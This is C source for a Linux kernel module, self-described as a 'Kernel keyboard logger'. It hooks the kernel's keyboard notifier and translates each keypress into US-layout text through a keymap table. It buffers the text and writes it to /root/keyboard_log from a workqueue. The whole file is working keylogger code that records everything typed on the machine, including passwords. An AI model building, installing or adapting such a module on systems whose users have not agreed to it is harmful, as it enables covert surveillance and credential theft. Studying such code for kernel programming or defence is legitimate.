// SPDX-License-Identifier: GPL-2.0
/*
 * Copyright (C) 2024 Emanuele Santini <emanuele.santini.88@gmail.com>
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>

/* CHANGE THIS TO YOUR PREFER LOCATION */
#define LOG_FILE_PATH       "/root/keyboard_log"

/* Size of the side and back buffer */
#define MAX_BUFFER_SIZE     256

/* Size of the temporaney keyboard string buffer */
#define TMP_BUFF_SIZE       16 

struct keyboard_logger {
    struct file *log_file;
    
    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;
    
    char *keyboard_buffer;
    char *write_buffer;
    
    // Length of the data currently written by the keyboard_buffer
    size_t buffer_offset;
    // Length of the write_buffer data ready to write
    size_t buffer_len;
    // Writing position on the keyboard_log file
    loff_t file_off;
    
    /* Keyboard input are recorded on the buffer pointed by the keyboard_buffer.
     * This buffer is switched with the write_buffer buffer to perform the write_log_task
     */ 
    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];
};

static int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data);
static void write_log_task(struct work_struct *work);
static size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
static void flush_buffer(struct keyboard_logger *klogger);

/* 
 * US keymap
 * I got this from: https://github.com/jarun/spy/blob/master/spy.c
 */
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

void flush_buffer(struct keyboard_logger *klogger)
{
    // Swap the buffer
    char *tmp = klogger->keyboard_buffer;
    klogger->keyboard_buffer = klogger->write_buffer;
    klogger->write_buffer = tmp;
    klogger->buffer_len = klogger->buffer_offset;
    
    // Start to write the buffer to the log file
    schedule_work(&klogger->writer_task);
    
    // Reset the keyboard buffer
    memset(klogger->keyboard_buffer, 0x0, MAX_BUFFER_SIZE);
    klogger->buffer_offset = 0;
}

// Returns the size of the string copied into the buffer, with its maximum being buff_size.
size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size)
{
    memset(buffer, 0x0, buff_size);
    
	if(keycode > KEY_RESERVED && keycode <= KEY_PAUSE) 
	{
	    // If shift is pressed we want a capital letter
		const char *us_key = (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
		snprintf(buffer, buff_size, "%s", us_key);
		// strlen(buffer) couldn't be greather than buff_size
		return strlen(buffer);
	}
	
	return 0;
}

/* 
 * This callback is executed by the VT driver when a key event is performed.
 * This task is executed in an atomic context, we cannot sleep!
 * So we cannot perform the write_kernel here to write the log on the file.
 */
int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data)
{
    struct keyboard_logger *klogger;
    struct keyboard_notifier_param *key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];
    
    klogger = container_of(kblock, struct keyboard_logger, keyboard_notifier);
    key_param = (struct keyboard_notifier_param *)data;
    
	// Log only when a key is pressed down OR the value of keyboard_notifier_param has a mapped keyboard string/character
	if(!(key_param->down) || (keystr_len = keycode_to_us_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE)) < 1)
	    return NOTIFY_OK;
	
	// With the endline we will swap the buffer and write it on the log file
	if(tmp_buff[0] == '\n')
	{
    	klogger->keyboard_buffer[klogger->buffer_offset++] = '\n';
	    flush_buffer(klogger);
	    return NOTIFY_OK;
	}
	
	/* The last byte is reserved for the endline character.
	 * So, I need to swap the buffer when the (offset + keystr_len) is EQUAL or greater than MAX_BUFFER_SIZE - 1
	 */
	if((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
	    flush_buffer(klogger);
	
	strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
	klogger->buffer_offset += keystr_len;
    
    return NOTIFY_OK;
}

/* 
 * This is an asynchronous task performed by the kernel workqueue. 
 * Here we will write the key_buffer into the log_file.
 * The write_kernel call could sleep, so we need to do this in a process context.
 */
void write_log_task(struct work_struct *work)
{
    struct keyboard_logger *klogger;

    klogger = container_of(work, struct keyboard_logger, writer_task);
    
    // Write the file
    kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
}

static struct keyboard_logger *klogger;

static int __init k_key_logger_init(void)
{
    if((klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL)) == NULL)
    {
        pr_err("Unable to alloc memory\n");
        return -ENOMEM;
    }
    
    klogger->keyboard_notifier.notifier_call = keyboard_callback;
    INIT_WORK(&klogger->writer_task, &write_log_task);
    
    // Open the log file
    if(IS_ERR(klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
    	return -EINVAL;
	}
	
	// Setup the double buffer
	klogger->keyboard_buffer = klogger->side_buffer;
	klogger->write_buffer = klogger->back_buffer;

	register_keyboard_notifier(&klogger->keyboard_notifier);

	return 0;	
}

static void __exit k_key_logger_exit(void)
{
	unregister_keyboard_notifier(&klogger->keyboard_notifier);
	// Close the log file
	fput(klogger->log_file);
    kfree(klogger);
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Emanuele Santini <emanuele.santini.88@gmail.com>");
MODULE_DESCRIPTION("Kernel keyboard logger");

